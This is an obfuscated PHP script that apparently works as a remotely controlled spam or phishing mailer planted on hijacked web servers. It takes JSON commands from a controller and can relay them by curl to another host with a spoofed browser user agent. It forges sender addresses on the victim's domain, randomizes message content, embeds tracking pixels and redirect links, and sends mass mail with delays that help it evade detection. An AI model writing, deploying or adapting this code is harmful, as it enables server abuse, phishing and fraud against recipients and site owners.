<?php
@ini_set('max_execution_time', '3600'); @ini_set('max_input_time', '3600'); @set_time_limit(3600); @date_default_timezone_set('UTC'); class Macros { private $values = array(); private $fixed = array(); private $used = array(); private $_keys = array(); public function __get($sp7cf253) { if ($sp7cf253 == 'keys') { return array_keys($this->_keys); } } public function Import($sp7cf253, $sp14e11b) { if (is_array($sp14e11b)) { $this->values[$sp7cf253] = array(); foreach ($sp14e11b as $sp46dcd1) { if (!empty($sp46dcd1['key'])) { $this->values[$sp7cf253][$sp46dcd1['key']] = $sp46dcd1['value']; } else { $this->values[$sp7cf253][] = $sp46dcd1['value']; } } } else { $this->Assign($sp7cf253, $sp14e11b); } } public function Assign($sp7cf253, $sp2cb76b) { $this->values[$sp7cf253] = $sp2cb76b; } public function Parse($spfb7582) { $sp9f8323 = ''; $sp42fcd9 = 0; while (true) { $sp1cc637 = strpos($spfb7582, '{', $sp42fcd9); if ($sp1cc637 === false) { $sp9f8323 .= substr($spfb7582, $sp42fcd9); break; } $sp9f8323 .= substr($spfb7582, $sp42fcd9, $sp1cc637 - $sp42fcd9); $sp42fcd9 = $sp1cc637 + 1; $sp10b89c = ''; $sp79f417 = '{'; $spa1376c = array(); $spe91918 = false; $sp907a4c = false; $sp228a82 = 'var'; while ($sp42fcd9 < strlen($spfb7582)) { $spd9d06d = substr($spfb7582, $sp42fcd9, 1); $sp79f417 .= $spd9d06d; if ($spd9d06d == ',' || $spd9d06d == '>' || $spd9d06d == '|') { if ($sp228a82 == 'alias') { $spe91918 = $sp10b89c; } elseif ($sp228a82 == 'mod') { $sp907a4c = $sp10b89c; } else { $spa1376c[] = $sp10b89c; } $sp10b89c = ''; if ($spd9d06d == '>') { $sp228a82 = 'alias'; } if ($spd9d06d == '|') { $sp228a82 = 'mod'; } $sp42fcd9++; continue; } if ($spd9d06d == '}') { if ($sp228a82 == 'alias') { $spe91918 = $sp10b89c; } elseif ($sp228a82 == 'mod') { $sp907a4c = $sp10b89c; } else { $spa1376c[] = $sp10b89c; } $sp42fcd9++; break; } $sp10b89c .= $spd9d06d; if (preg_match('/[0-9A-Za-z_\\[\\]\\-\\^!]/', $spd9d06d) == 0) { $sp42fcd9++; $spa1376c = array(); break; } $sp42fcd9++; } if (sizeof($spa1376c) == 0) { $sp9f8323 .= $sp79f417; continue; } $sp9f26b0 = false; $sp6ea3da = false; if (preg_match('/^\\^/', $spa1376c[0]) > 0) { $spa1376c[0] = substr($spa1376c[0], 1); $sp9f26b0 = true; } if (preg_match('/^\\!/', $spa1376c[0]) > 0) { $spa1376c[0] = substr($spa1376c[0], 1); $sp6ea3da = true; } $spef3e6e = false; if (preg_match('/\\[([0-9A-Za-z_]+)\\]/', $spa1376c[0], $spbb5e76) > 0) { $spef3e6e = $spbb5e76[1]; } elseif (preg_match('/\\[([\\d\\-]+)\\]/', $spa1376c[0], $spbb5e76) > 0) { $spef3e6e = explode('-', $spbb5e76[1]); } if ($spef3e6e !== false) { $spa1376c[0] = substr($spa1376c[0], 0, strpos($spa1376c[0], '[')); } $this->_keys[$spa1376c[0]] = true; if (empty($this->values[$spa1376c[0]]) && empty($this->fixed[$spa1376c[0]])) { continue; } if ($sp9f26b0) { unset($this->fixed[$spa1376c[0]]); } if (isset($this->fixed[$spa1376c[0]])) { $sp37ee0b = $this->fixed[$spa1376c[0]]; } else { $sp37ee0b = ''; $spc86a25 = 1; if (sizeof($spa1376c) == 2) { $spc86a25 = $spa1376c[1]; } if (sizeof($spa1376c) == 3) { $spc86a25 = rand($spa1376c[1], $spa1376c[2]); } for ($spee6a8b = 0; $spee6a8b < $spc86a25; $spee6a8b++) { if (is_array($this->values[$spa1376c[0]])) { if (!is_array($this->used[$spa1376c[0]])) { $this->used[$spa1376c[0]] = array(); } if (count($this->used[$spa1376c[0]]) == count($this->values[$spa1376c[0]])) { $this->used[$spa1376c[0]] = array(); } if ($spef3e6e !== false && is_scalar($spef3e6e)) { $sp37ee0b .= $this->values[$spa1376c[0]][$spef3e6e]; $this->used[$spef3e6e] = true; } else { $sp276927 = array(); if (is_array($spef3e6e)) { $sp3bf9d4 = $spef3e6e[0]; $sp9a0555 = $spef3e6e[1]; } else { $sp3bf9d4 = 0; $sp9a0555 = count($this->values[$spa1376c[0]]) - 1; } for ($spfc8955 = $sp3bf9d4; $spfc8955 <= $sp9a0555; $spfc8955++) { if ($sp6ea3da && !empty($this->used[$spa1376c[0]][$spfc8955])) { continue; } $sp276927[] = $spfc8955; } $sp0ad044 = $sp276927[rand(0, count($sp276927) - 1)]; $this->used[$spa1376c[0]][$sp0ad044] = true; $sp37ee0b .= $this->values[$spa1376c[0]][$sp0ad044]; } } else { $sp37ee0b .= $this->values[$spa1376c[0]]; } } } $sp37ee0b = $this->Parse($sp37ee0b); if ($sp907a4c !== false) { for ($sp8b82a3 = 0; $sp8b82a3 < strlen($sp907a4c); $sp8b82a3++) { switch (substr($sp907a4c, $sp8b82a3, 1)) { case 'b': $sp37ee0b = base64_encode($sp37ee0b); break; case 'q': $sp37ee0b = quoted_printable_encode($sp37ee0b); break; default: break; } } } if ($sp9f26b0) { $this->fixed[$spa1376c[0]] = $sp37ee0b; } if ($spe91918 !== false && $spe91918 != '') { $this->fixed[$spe91918] = $sp37ee0b; } $sp9f8323 .= $sp37ee0b; } return $sp9f8323; } } $spfdc414 = file_get_contents('php://input'); $sp4adc3b = json_decode($spfdc414, true); if (empty($sp4adc3b['via_proxy'])) { $sp4adc3b['via_proxy'] = true; $sp503a1f = curl_init($sp4adc3b['prefix'] . $sp4adc3b['files']['s']); $spb31755 = json_encode($sp4adc3b); curl_setopt($sp503a1f, CURLOPT_CONNECTTIMEOUT, 30); curl_setopt($sp503a1f, CURLOPT_TIMEOUT, 600); curl_setopt($sp503a1f, CURLOPT_RETURNTRANSFER, true); curl_setopt($sp503a1f, CURLOPT_USERAGENT, 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_6) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.0.3 Safari/605.1.15'); curl_setopt($sp503a1f, CURLOPT_REFERER, $spd1ccbf); curl_setopt($sp503a1f, CURLOPT_POST, true); curl_setopt($sp503a1f, CURLOPT_POSTFIELDS, $spb31755); curl_setopt($sp503a1f, CURLOPT_HTTPHEADER, array('Content-Type: application/json', 'Content-Length: ' . strlen($spb31755))); $spa89dc8 = curl_exec($sp503a1f); echo $spa89dc8; die; } $sp2cc5f0 = $_SERVER['SERVER_ADDR']; $sp57bb0f = $_SERVER['HTTP_HOST']; $sp57bb0f = preg_replace('/^www\\./', '', $sp57bb0f); $sp4a4b39 = new Macros(); $sp4a4b39->Assign('server_addr', $sp2cc5f0); $sp4a4b39->Assign('server_host', $sp57bb0f); foreach ($sp4adc3b['macros'] as $sp7cf253 => $sp14e11b) { $sp4a4b39->Import($sp7cf253, $sp14e11b); } $sp4071d4 = preg_replace('/^www\\./i', '', $sp57bb0f); $spefb9a3 = $sp4a4b39->Parse('{from_user}@' . $sp4071d4); $sp4a4b39->Assign('from_email', $spefb9a3); $sp4a4b39->Assign('prefix', $sp4adc3b['prefix']); $sp4a4b39->Assign('html', $sp4adc3b['letter']['html']); $sp42fcd9 = 0; $spc681a0 = 0; $spb5206f = 0; $spa18e35 = array(); foreach ($sp4adc3b['rcpt'] as $sp777696) { $sp4a4b39->Assign('email', $sp777696['email']); $sp4a4b39->Assign('entry', $sp777696); $sp4a4b39->Assign('date', date('r')); $sp4a4b39->Assign('redirect', $sp4adc3b['prefix'] . $sp4adc3b['files']['r']); $sp4a4b39->Assign('redirect_with_uri', $sp4adc3b['prefix'] . $sp4adc3b['files']['r'] . '?uri='); $sp4a4b39->Assign('unsubscribe', $sp4adc3b['prefix'] . $sp4adc3b['files']['u'] . '?id=' . $sp777696['id']); $sp4a4b39->Assign('delivery', '<img src="' . $sp4adc3b['prefix'] . $sp4adc3b['files']['d'] . '?id=' . $sp777696['id'] . '" />'); $spbca6f7 = $sp4a4b39->Parse($sp4adc3b['envelope']['header']); $spf6b2e1 = $sp4a4b39->Parse($sp4adc3b['envelope']['body']); if (!empty($sp777696['name'])) { $sp02b2d6 = $sp777696['name'] . ' <' . $sp777696['email'] . '>'; } else { $sp02b2d6 = $sp777696['email']; } $sp72be18 = $sp4a4b39->Parse($sp4adc3b['letter']['subject']); if ($sp42fcd9 > 0) { sleep(rand(3, 8)); } $spb4e370 = mail($sp02b2d6, $sp72be18, $spf6b2e1, $spbca6f7); $spa18e35[$sp777696['id']] = $spb4e370; if ($spb4e370) { $spc681a0++; } else { $spb5206f++; } $sp42fcd9++; } echo serialize(array('total' => count($sp4adc3b['rcpt']), 'sent' => $sp42fcd9, 'success' => $spc681a0, 'error' => $spb5206f, 'rcpt' => $spa18e35));